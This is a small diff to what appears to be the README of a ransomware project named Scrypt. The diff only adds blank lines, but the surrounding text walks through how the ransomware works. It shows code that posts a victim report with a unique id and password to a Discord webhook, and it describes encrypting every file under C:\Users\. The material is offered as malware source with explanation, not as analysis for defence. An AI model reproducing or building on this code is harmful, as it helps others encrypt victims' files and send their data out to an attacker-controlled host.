@@ -51,6 +51,7 @@ discordWebhook = ""
 
 <h3 align="center">Understanding the Code</h4>
 Scrypt starts off with the flashing screen to grab the users attention however in the background the ransomware itself runs, it starts of by sending a message which just gives a detailed report of our user along with the unique id and seeded password.
+
 `````
 	def sendMessage(self):
 		try:
@@ -75,6 +76,7 @@ Scrypt starts off with the flashing screen to grab the users attention however i
 			}
 		r = requests.post(discordWebhook, json=data) #makes a post request to our webhook with given data
 `````
+
  Next starts the file encryption, our ransomware goes through every file in the provided folder path, in this case being `C:\\Users\\` and then proceeds to get handles for each filepath which will be passed as an argument for when we want to encrypt our files.  
 ```
 	def run(self):
